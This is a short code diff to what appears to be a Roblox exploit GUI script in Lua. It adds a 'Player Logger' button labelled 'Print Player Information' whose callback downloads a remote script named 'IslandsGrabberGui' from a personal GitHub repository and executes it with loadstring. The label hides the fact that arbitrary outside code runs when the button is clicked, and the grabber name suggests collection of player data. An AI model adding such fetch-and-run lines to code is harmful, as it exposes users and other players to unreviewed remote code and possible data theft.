@@ -358,6 +358,20 @@ Other:AddButton({
   	end    
 })
 
+
+-- PLAYER LOGGER
+local Section = Other:AddSection({
+	Name = "Player Logger"
+})
+Other:AddButton({
+	Name = "Print Player Information",
+	Callback = function()
+      		loadstring(game:HttpGet('https://raw.githubusercontent.com/Bukito20/Public-scripts/main/IslandsGrabberGui'))()
+
+  	end    
+})
+
+
 -- Settings
 local Settings = Window:MakeTab({
 	Name = "Settings",
